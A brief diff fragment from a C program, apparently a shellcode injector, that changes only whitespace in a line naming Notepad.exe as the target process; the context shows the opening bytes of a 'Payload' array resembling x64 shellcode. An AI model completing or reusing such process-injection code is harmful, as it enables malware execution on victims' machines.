@@ -2,7 +2,7 @@
 #include <stdio.h>
 
 #pragma warning (disable:4996)
-#define TARGET_PROCESS		"Notepad.exe"
+#define TARGET_PROCESS "Notepad.exe"
 
 unsigned char Payload[] = {
 	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
